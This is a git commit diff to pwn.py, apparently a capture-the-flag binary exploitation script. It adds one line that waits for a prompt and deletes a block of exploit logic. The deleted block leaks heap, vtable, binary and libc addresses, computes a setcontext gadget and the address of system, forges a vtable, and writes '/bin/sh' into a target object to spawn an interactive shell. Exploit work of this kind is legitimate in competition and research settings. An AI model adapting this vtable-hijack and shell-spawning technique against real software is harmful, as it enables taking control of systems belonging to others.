d37ef4be9a15b6547588a57ef8fe3c0e8b8e825e
Niklas Baumstark <niklas.baumstark@gmail.com>
2018-06-13 00:26:33 +0200

    stuff

--- pwn.py
+++ pwn.py
@@ -19,6 +19,7 @@ def throw(s, wait=True):
     wait_for_menu()
     sendln(2)
     sendln("throw")
+    ru('throw? ')
     sendln(s)
     if wait:
         return talk()
@@ -40,38 +41,3 @@ def write(addr, what):
     current,_ = bread(0)
     _,_ = bread((addr-current)%2**64)
     throw(what, wait=False)
-
-raw_input('press ENTER to continue')
-
-get('x')
-
-throw('x'*200)
-
-string_buf,_ = bread(0)
-info('original buffer @ %p', string_buf)
-animal = string_buf - 0x100219270 + 0x100218e90
-info('animal @ %p', animal)
-
-vtable = read(animal)
-info('vtable @ %p', vtable)
-binary = vtable - 0x203d48
-info('binary @ %p', binary)
-memcpy = read(binary + 0x204058)
-info('memcpy @ %p', binary)
-libc = memcpy - 0x00007ffff728e440 + 0x00007ffff7137000
-info('libc @ %p', libc)
-setcontext_gadget = libc + 0x7ffff717b9e7 - 0x00007ffff7137000
-system = libc + 0x7ffff7178fa0 - 0x00007ffff7137000
-
-vtab = ""
-vtab += p64(0x41414141)
-vtab += p64(0x42424242)
-vtab += p64(setcontext_gadget)
-assert not "\n" in vtab
-
-write(string_buf, vtab)
-write(animal+0x68, p64(animal+0x70)+"/bin/sh")
-write(animal+0xa8, p64(system))
-write(animal, p64(string_buf))
-
-interact()
